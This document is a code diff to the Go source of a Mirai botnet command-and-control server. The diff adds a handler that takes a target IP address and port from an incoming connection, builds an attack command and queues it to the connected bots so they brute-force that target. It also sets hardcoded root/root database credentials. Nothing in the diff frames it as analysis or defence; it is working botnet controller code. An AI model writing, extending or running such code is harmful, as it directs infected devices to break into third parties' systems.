@@ -3,25 +3,27 @@ package main
 import (
     "fmt"
     "net"
+    "encoding/binary"
     "errors"
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
+const DatabaseAddr string   = "localhost"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "'"
+const DatabasePass string   = "root"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
+    fmt.Println("starting main")
     tel, err := net.Listen("tcp", "0.0.0.0:23")
     if err != nil {
         fmt.Println(err)
         return
     }
-
+    fmt.Println("connected!")
     api, err := net.Listen("tcp", "0.0.0.0:101")
     if err != nil {
         fmt.Println(err)
@@ -80,6 +82,41 @@ func initialHandler(conn net.Conn) {
         } else {
             NewBot(conn, buf[3], "").Handle()
         }
+    } else if l >= 1 && buf[0] == 0x00 {
+        if 7 - l > 0 {
+            tmp_buf, err := readXBytes(conn, 7-l)
+            if err != nil {
+                return
+            }
+            buf = append(buf, tmp_buf...)
+        }
+        // Sending brute force command to bot
+        var ipStr string
+        var portStr string
+        var err error
+        ipBuf := buf[1:5] // NOTE: MUST CONSIDER ENDIANESS OF DIFFERENT BOTS
+        ip := binary.BigEndian.Uint32(ipBuf)
+        ipStr += fmt.Sprint((ip >> 24) & 0xff)+"."
+        ipStr += fmt.Sprint((ip >> 16) & 0xff)+"."
+        ipStr += fmt.Sprint((ip >> 8) & 0xff) + "."
+        ipStr += fmt.Sprint(ip & 0xff)
+        //ip = binary.LittleEndian.Uint32(ipBuf)
+
+        portBuf := buf[5:7]
+        portStr = fmt.Sprint(binary.BigEndian.Uint16(portBuf))
+        atk := Attack {10,
+            11,
+            map[uint32]uint8{ip: 32},
+            map[uint8]string{7: portStr},
+        }
+        buf, err := atk.Build()
+        if err != nil {
+            conn.Write([]byte("ERR|An unknown error occurred\r\n"))
+            return
+        }
+        clientList.QueueBuf(buf, 0, "")
+        fmt.Printf("Received and sent %s:%s to bot to be bruted!\n", ipStr, portStr)
+        //conn.Write([]byte("OK\r\n"))
     } else {
         NewAdmin(conn).Handle()
     }
@@ -91,21 +128,19 @@ func apiHandler(conn net.Conn) {
     NewApi(conn).Handle()
 }
 
-func readXBytes(conn net.Conn, buf []byte) (error) {
+func readXBytes(conn net.Conn, amount int) ([]byte, error) {
+    buf := make([]byte, amount)
     tl := 0
 
-    for tl < len(buf) {
-        n, err := conn.Read(buf[tl:])
-        if err != nil {
-            return err
+    for tl < amount {
+        rd, err := conn.Read(buf[tl:])
+        if err != nil || rd <= 0 {
+            return nil, errors.New("Failed to read")
         }
-        if n <= 0 {
-            return errors.New("Connection closed unexpectedly")
-        }
-        tl += n
+        tl += rd
     }
 
-    return nil
+    return buf, nil
 }
 
 func netshift(prefix uint32, netmask uint8) uint32 {
